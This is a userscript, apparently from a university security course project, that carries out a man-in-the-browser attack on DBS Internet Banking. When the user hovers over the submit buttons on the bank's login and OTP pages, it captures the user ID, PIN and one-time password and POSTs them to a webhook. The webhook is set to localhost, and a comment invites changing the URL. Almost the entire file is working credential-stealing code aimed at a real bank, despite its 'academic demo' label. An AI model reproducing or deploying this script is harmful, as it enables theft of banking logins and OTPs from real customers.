// ==UserScript==
// @name         Malicious Script
// @namespace    https://github.com/ZechariahTan/CS5331-Project
// @version      0.1
// @description  Malicious MITB script attacking DBS Internet Banking, for academic demo purposes
// @author       Howard Liu
// @match        https://segmentfault.com/a/1190000021654926
// @match        https://internet-banking.dbs.com.sg/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=segmentfault.com
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    let $ = window.jQuery;

    function report(src, data) {
        // Some secret routines to submit whatever data you have
        // Modify the URL to test yourself
        $.ajax({
            type: "POST",
            url: "https://localhost/webhook.php",
            data: JSON.stringify({src: src, data: data}),
            contentType: "application/json; charset=utf-8",
            dataType: "json",
        });
    }

    function stealLoginCredential() {
        // Only targets login page
        if ($("#PIN").length) {
            console.log("stealLoginCredential registered");
            $("button.btn:nth-child(1)").on("mouseover", () => {
                let uid = $("#UID").val();
                let password = $("#PIN").val();
                report("stealLoginCredential", {uid: uid, password: password});
            });
        }
    }

    function getIBOTP() {
        let password = '';
        for (let i = 1; i <= 6; i++) {
            password += $("#mpin" + i).val();
        }
        return password;
    }

    function stealIBOTP() {
        // Only targets OTP page, this will be run within the iframe
        if ($("#mpin1").size) {
            console.log("stealIBOTP registered");
            $("#confirmButton").on("mouseover", () => {
                report("stealIBOTP", {otp: getIBOTP()});
            })
        } else {
            // Regularly check
            console.log("OTP input field not found, wait 500 ms");
            setTimeout(stealIBOTP, 500);
        }
    }

    function run() {
        if (typeof $ == 'undefined') {
            setTimeout(run, 500);
        } else {
            $(document).ready(function () {
                console.log("Hey! I am here!");
                stealLoginCredential();
                stealIBOTP();
            });
        }
    }

    run();
})();